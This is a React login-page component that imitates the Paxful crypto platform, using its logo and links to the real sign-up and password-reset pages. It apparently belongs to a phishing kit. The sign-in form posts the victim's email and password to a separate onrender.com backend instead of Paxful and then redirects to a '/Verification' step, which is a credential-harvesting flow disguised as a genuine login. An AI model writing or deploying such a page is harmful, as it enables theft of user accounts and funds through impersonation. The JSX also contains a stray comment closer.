import { useState } from 'react';
import { useNavigate } from 'react-router-dom'; // For navigation after login
import './LoginPage.css';

const LoginPage = () => {
  const [passwordVisible, setPasswordVisible] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const navigate = useNavigate(); // Hook to navigate

  const handleSubmit = async (event) => {
    event.preventDefault();

    if (!email || !password) {
        setError('Both email and password are required');
        return;
    }

    try {
        const response = await fetch('https://paxful-backend-3.onrender.com/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email, password }),
        });

        const data = await response.json();

        if (response.ok) {
            if (data.shouldNavigate) {
                navigate('/Verification');  // Example of navigation after successful login
            }
        } else {
            setError(data.error || 'Login failed. Please try again.');
        }
    } catch (err) {
        setError('An error occurred. Please try again later.');
    }
};


  const togglePasswordVisibility = () => {
    setPasswordVisible(!passwordVisible);
  };

  return (
    <div className="log_flex">
      <div className="log_flex_one">
        <div className="logo_one">
          <div className="img">
            <img src="/src/assets/logo.png" alt="Paxful" />
          </div>
        </div>
        <h5>Welcome back!</h5>
        <div className="se_l_flex">
          <p className="p_l_f_o">Dont have an account?</p>
          <a href="https://accounts.paxful.com/register" className="p_l_s_o">
            Sign up
          </a>
        </div>

        <form id="loginForm" onSubmit={handleSubmit}>
          {error && <p className="error">{error}</p>} {/* Display error message if validation fails */}
          
          <div className="imput_cont">
            <h4>Email / Phone Number</h4>
            <div className="input">
              <input
                type="email"
                name="email"
                id="email"
                placeholder="Email/Phone Number"
                value={email}
                onChange={(e) => setEmail(e.target.value)} // Update state with email input
              />
            </div>
          </div>
          
          <div className="imput_cont">
            <h4>Password</h4>
            <div className="input">
              <input
                id="password"
                type={passwordVisible ? 'text' : 'password'}
                name="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)} // Update state with password input
              />
            </div>
            <div className="eye" onClick={togglePasswordVisibility}>
              <i
                id="eyeIcon"
                className={`fa-regular ${passwordVisible ? 'fa-eye-slash' : 'fa-eye'}`}
              ></i>
            </div>
          </div>
          
          <div className="forgot">
            <a href="https://accounts.paxful.com/forgot-password">Forgot password</a>
          </div>
          
          <button type="submit" className="log_btn">
            Sign in
          </button>
        </form>
      </div>
      
      <div className="log_flex_two">
        <div className="log_flex_two_bg_relative">
          <div className="log_fle_two_log_bg">
          <div className="img">
              <img src="/src/assets/rightlogo.png" /> */
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
